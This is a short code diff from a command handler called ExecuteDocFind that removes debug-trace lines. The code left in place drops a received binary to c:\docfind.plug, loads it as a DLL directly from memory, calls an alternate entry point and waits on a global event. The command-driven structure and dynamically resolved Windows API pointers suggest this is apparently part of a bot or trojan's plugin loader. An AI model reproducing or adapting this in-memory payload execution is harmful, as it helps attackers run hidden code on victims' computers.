@@ -754,26 +754,20 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 	bool res = false;
 	if( data )
 	{
-		TASKDBG( "----", "0" );
 		File::WriteBufferA( "c:\\docfind.plug", data, size );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
-		TASKDBG( "----", "01" );
 		if( module )
 		{
-			TASKDBG( "----", "1" );
 			DWORD* gAltEPOffs = (DWORD*) MemoryGetProcAddress( module, "gAltEPOffs" );
 			if( gAltEPOffs )
 			{
-				TASKDBG( "----", "2" );
 				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
 				if( func )
 				{
-					TASKDBG( "----", "3" );
 					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
-					TASKDBG( "----", "4" );
 				}
 			}
 			MemoryFreeLibrary(module);
